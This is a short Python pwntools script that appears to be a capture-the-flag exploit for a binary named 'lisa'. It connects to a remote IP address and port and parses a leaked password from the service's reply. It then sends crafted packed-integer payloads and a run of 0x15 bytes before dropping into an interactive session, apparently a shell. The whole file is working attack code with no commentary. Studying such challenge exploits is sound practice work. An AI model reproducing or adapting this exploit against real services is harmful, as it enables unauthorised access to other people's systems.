from pwn import *

#p = process("./lisa")
p = remote("18.191.244.121", 12345)

def exp():
	pause()
	resp = p.recvuntil("\n")
	passwd = resp.split(" ")[3]

	print "pass: " + passwd

	payload1 = p32(0)
	payload1 += p32(int(passwd, 16))
	payload1 += p32(0x2b)
	p.sendline(payload1)

	payload2 = "\x15" * 0x1d
	p.send(payload2)

	p.send(p32(0x0))
	p.interactive()
if __name__=="__main__":
	exp()
